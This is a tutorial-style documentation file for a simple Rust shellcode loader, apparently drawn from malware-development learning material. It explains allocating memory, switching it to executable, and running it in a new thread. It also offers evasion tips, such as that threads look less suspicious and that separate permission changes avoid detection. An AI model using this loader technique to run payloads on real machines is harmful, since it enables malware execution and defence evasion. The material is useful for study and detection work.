# Docs for this

## Intro:

A shellcode executor written in Rust, originally borrowed from: [Rust for Malware Development](https://github.com/Whitecat18/Rust-for-Malware-Development/blob/main/Basics/Payload_Exec_with_explain.rs). 

Meant to be stupid simple. Basically, take shellcode, load it into memory, and run it in the current process.

## Resources:

#### Windows Memory API:
- [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

#### Windows Memory Constants 
- [Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)

---

## Docs:

### Allocating memory for the shellcode:

We use `VirtualAlloc` to allocate memory based on the shellcode size.

#### `VirtualAlloc` definition:

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress, // Address of memory
  [in]           SIZE_T dwSize,    // Memory size
  [in]           DWORD  flAllocationType, // Allocation type. See:
  [in]           DWORD  flProtect
);
```

- `flAllocationType`: [Types and Docs Here](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- `flProtect`: Uses memory constants. [Docs Here](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)

#### Usage:

```rust
let shellcode_addr = VirtualAlloc(
    null_mut(),                   // Address hint (nullptr means the system chooses the address)
    shellcode.len(),              // Size of the memory block
    MEM_COMMIT | MEM_RESERVE,     // Allocation type
    PAGE_READWRITE,               // Memory protection
);
```

- **`null_mut()`**: `std::ptr::null_mut` in Rust, is a pointer with an address of 0. `VirtualAlloc` requires an address, so we use `null_mut()`.
   - Docs: [Rust Null Pointer](https://doc.rust-lang.org/stable/std/ptr/fn.null_mut.html)
   
- **`shellcode.len()`**: Refers to the length of the shellcode we defined earlier.

- **`MEM_COMMIT | MEM_RESERVE`**: These flags are used together to reserve and commit pages in one call, per the documentation.  
   - `MEM_COMMIT`: Allocates memory charges for the reserved pages and zeros the memory.
   - `MEM_RESERVE`: Reserves the memory in the process space without touching the pagefile/disk.
   - For more, see the `flAllocationType` [Docs](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).

- **`PAGE_READWRITE`**: A memory constant that makes the memory page readable and writable.

---

### Protecting Memory / Changing Memory Block Permissions

We use `VirtualProtect` to change the memory permissions to `PAGE_EXECUTE_READWRITE`, making the memory executable.

**Why not allocate and make executable in one call?**

Best practices (and tools like DEP) suggest separating the allocation and execution permission changes for security reasons. This approach minimizes the window of opportunity for attackers to write to executable memory. Additionally, certain security solutions might flag memory that is immediately allocated as executable.

#### `VirtualProtect` definition:

```c
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

#### Usage:

```rust
let mut old_protection = 0;

let virtualprotect = VirtualProtect(
    shellcode_addr,               // Starting page address
    shellcode.len(),              // Shellcode size
    PAGE_EXECUTE_READWRITE,       // New memory protection options
    &mut old_protection           // Store previous protection here
);
```

- **`lpAddress`**: `shellcode_addr`—this is the address of the allocated memory block where the shellcode resides.

- **`dwSize`**: The size of the shellcode block, obtained using `shellcode.len()`.

- **`flNewProtect`**: `PAGE_EXECUTE_READWRITE` is used to make the memory executable, readable, and writable.

- **`lpflOldProtect`**: This is an out-parameter where the previous memory protection is stored. We pass `&mut old_protection`, a mutable reference to store this value.

---

### Creating a Thread to Execute the Shellcode

Next, we create a thread to execute the shellcode. Using threads, rather than processes, is often preferred in offensive operations because threads are less suspicious and are faster to create compared to processes.

#### Resources:
- [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
- [Transmute in Rust](https://doc.rust-lang.org/std/mem/fn.transmute.html)

#### `CreateThread` definition:

```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  LPVOID                  lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

#### Usage:

```rust
let hthread = CreateThread(
    null_mut(),                         // Security attributes (none)
    0,                                  // Stack size (default)
    Some(std::mem::transmute(shellcode_addr)),  // Shellcode address as the thread start address
    null_mut(),                         // No thread parameter
    0,                                  // Start the thread immediately
    null_mut(),                         // No thread ID needed
);
```

- **`null_mut()`**: As before, this is a pointer with an address of 0, representing null in Rust.
  
- **`0`**: The default stack size for the thread.

- **`Some(std::mem::transmute(shellcode_addr))`**: This casts the shellcode address into a function pointer so it can be executed. The `transmute` function performs this unsafe conversion without checking the validity of the shellcode. Use with caution!
   - Docs: [Rust Transmute](https://doc.rust-lang.org/std/mem/fn.transmute.html)

- **`null_mut()`**: No thread parameters needed.

- **`0`**: Starts the thread immediately.

- **`null_mut()`**: No need for the thread ID, so we pass a null pointer.

---

### Waiting for the Shellcode to Finish Executing

Finally, we wait for the created thread to finish execution using `WaitForSingleObject`.

#### Resources:
- [WaitForSingleObject](https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.WaitForSingleObject.html)

#### `WaitForSingleObject` definition:

```c
DWORD WaitForSingleObject(
  HANDLE hHandle,       // Handle to the object to wait on
  DWORD dwMilliseconds  // Time to wait in milliseconds (or INFINITE)
);
```

#### Usage:

```rust
WaitForSingleObject(hthread, 0xFFFFFFFF); // Wait indefinitely for the thread to finish
```

- **`hthread`**: Handle to the thread that was created with `CreateThread`.
- **`0xFFFFFFFF`**: This constant represents an infinite wait, meaning the program will wait until the thread completes.

